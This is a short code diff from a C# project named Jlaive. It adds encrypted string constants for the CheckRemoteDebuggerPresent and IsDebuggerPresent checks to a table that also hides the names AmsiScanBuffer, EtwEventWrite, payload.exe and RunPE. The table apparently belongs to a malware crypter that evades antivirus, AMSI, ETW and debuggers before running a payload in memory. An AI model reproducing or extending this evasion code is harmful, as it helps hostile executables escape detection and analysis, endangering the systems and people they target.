@@ -86,6 +86,8 @@ namespace Jlaive
                 { "isdebuggerpresent_name", RandomString(20, rng) },
                 { "amsiscanbuffer_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), Key, IV)) },
                 { "etweventwrite_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("EtwEventWrite"), Key, IV)) },
+                { "checkremotedebugger_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), Key, IV)) },
+                { "isdebuggerpresent_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), Key, IV)) },
                 { "payloadexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("payload.exe"), Key, IV)) },
                 { "runpedllexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.dll"), Key, IV)) },
                 { "runpeclass_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.RunPE"), Key, IV)) },
